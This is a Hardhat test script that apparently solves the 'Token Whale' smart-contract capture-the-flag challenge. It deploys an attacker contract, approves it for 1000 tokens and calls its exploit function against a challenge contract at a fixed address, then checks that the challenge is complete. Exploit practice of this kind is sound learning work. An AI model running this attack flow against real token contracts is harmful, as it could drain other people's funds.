import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

describe("TokenWhaleChallenge", function () {
  let player: SignerWithAddress;
  const challengeContractAddress = "0xe4E04E6b95ef9683EAf5eA1Bc24fa3861e549c90";

  before(async () => {
    player = (await ethers.getSigners())[0];
    this.ctx.challengeContract = await ethers.getContractAt(
      "TokenWhaleChallenge",
      challengeContractAddress
    );
  });
  it("exploit", async function () {
    const TokenWhaleAttacker = await ethers.getContractFactory(
      "TokenWhaleAttacker",
      player
    );

    this.attackerContract = await TokenWhaleAttacker.deploy();
    await this.attackerContract.deployed();

    let tx = await this.challengeContract
      .connect(player)
      .approve(this.attackerContract.address, 1000);

    console.log(await tx.wait());

    tx = await this.attackerContract.exploit(
      this.challengeContract.address,
      1000
    );
    console.log(await tx.wait());
  });

  after(async () => {
    expect(await this.ctx.challengeContract.isComplete()).to.be.true;
  });
});
